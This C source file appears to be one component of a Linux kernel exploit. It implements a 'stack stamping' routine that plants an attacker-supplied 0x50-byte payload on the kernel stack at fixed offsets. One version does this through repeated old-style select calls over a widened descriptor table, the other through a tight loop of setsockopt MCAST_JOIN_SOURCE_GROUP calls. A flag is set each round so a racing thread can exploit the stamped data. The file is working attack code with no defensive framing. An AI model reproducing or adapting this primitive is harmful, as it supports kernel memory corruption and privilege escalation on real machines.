#define _GNU_SOURCE

#include <errno.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <netinet/in.h>

#include "offset.h"
#include "kernelsnitch/utils.h"

extern atomic_int g_consumer_go;

#define STAMP_PAYLOAD_BYTES 0x50

#if defined(STAMP_VIA_SELECT) && STAMP_VIA_SELECT

#ifndef __NR__newselect
#define __NR__newselect 142
#endif

#ifndef STAMP_NFDS
#define STAMP_NFDS 320
#endif
#ifndef STAMP_WAITER_OFF
#define STAMP_WAITER_OFF 0x30
#endif

#define STAMP_SET_BYTES (STAMP_NFDS / 8)

struct old_timeval32 {
    int32_t tv_sec;
    int32_t tv_usec;
};

static void widen_fdtable(void) {
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 &&
        rl.rlim_cur < (rlim_t)(STAMP_NFDS + 128)) {
        rl.rlim_cur = (rl.rlim_max < (rlim_t)(STAMP_NFDS + 128))
                          ? rl.rlim_max
                          : (rlim_t)(STAMP_NFDS + 128);
        setrlimit(RLIMIT_NOFILE, &rl);
    }

    int pfd[2];
    if (pipe(pfd) != 0) {
        pr_warning("Stamp: pipe failed errno=%d\n", errno);
        return;
    }
    int wr = STAMP_NFDS + 64;
    if (dup2(pfd[1], wr) < 0)
        pr_warning("Stamp: dup2 write-end failed errno=%d\n", errno);
    if (pfd[1] != wr)
        close(pfd[1]);
    for (int fd = 3; fd < STAMP_NFDS; fd++) {
        if (fd == pfd[0] || fd == wr)
            continue;
        dup2(pfd[0], fd);
    }
}

void do_stamp_stack(uint64_t *buf) {
    uint8_t sets[3][STAMP_SET_BYTES];
    const uint8_t *payload = (const uint8_t *)buf;

    memset(sets, 0, sizeof(sets));

    {
        size_t avail = sizeof(sets) - STAMP_WAITER_OFF;
        size_t n = STAMP_PAYLOAD_BYTES < avail ? STAMP_PAYLOAD_BYTES : avail;
        memcpy((uint8_t *)sets + STAMP_WAITER_OFF, payload, n);
    }

    widen_fdtable();

    pr_info("Stamp: select n=%d, waiter at +0x%x\n",
            STAMP_NFDS, STAMP_WAITER_OFF);

#ifdef DEBUG
    {
        struct old_timeval32 tv = { 1, 0 };
        uint8_t i2[STAMP_SET_BYTES], o2[STAMP_SET_BYTES], e2[STAMP_SET_BYTES];
        struct timespec t0, t1;
        char msg[160];
        memcpy(i2, sets[0], STAMP_SET_BYTES);
        memcpy(o2, sets[1], STAMP_SET_BYTES);
        memcpy(e2, sets[2], STAMP_SET_BYTES);
        clock_gettime(CLOCK_MONOTONIC, &t0);
        long r = syscall(__NR__newselect, STAMP_NFDS, i2, o2, e2, &tv);
        int e = errno;
        clock_gettime(CLOCK_MONOTONIC, &t1);
        long ms = (t1.tv_sec - t0.tv_sec) * 1000 +
                  (t1.tv_nsec - t0.tv_nsec) / 1000000;
        int n = snprintf(msg, sizeof(msg),
                         "[*] stamp: probe select ret=%ld errno=%d elapsed=%ldms "
                         "(want ~1000ms)\n", r, e, ms);
        write(2, msg, n);
    }
#endif

    for (;;) {
        struct old_timeval32 tv = { 0, 50000 };
        uint8_t in[STAMP_SET_BYTES];
        uint8_t out[STAMP_SET_BYTES];
        uint8_t ex[STAMP_SET_BYTES];

        memcpy(in, sets[0], STAMP_SET_BYTES);
        memcpy(out, sets[1], STAMP_SET_BYTES);
        memcpy(ex, sets[2], STAMP_SET_BYTES);

        atomic_store(&g_consumer_go, 1);

        syscall(__NR__newselect, STAMP_NFDS, in, out, ex, &tv);
    }
}

#else

#ifndef STAMP_SETSOCKOPT_OFF
#define STAMP_SETSOCKOPT_OFF 0x34
#endif

void do_stamp_stack(uint64_t *buf) {
    int fd = socket(AF_INET6, SOCK_DGRAM, 0);
    uint8_t buffer[260];
    if (fd < 0) {
        pr_warning("Do_stamp_stack: socket failed errno=%d\n", errno);
        return;
    }
    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer + STAMP_SETSOCKOPT_OFF, buf, STAMP_PAYLOAD_BYTES);
    uint64_t times = 10000000;

    while (times--) {
        atomic_store(&g_consumer_go, 1);
        setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buffer, 260);
    }
    close(fd);
}

#endif
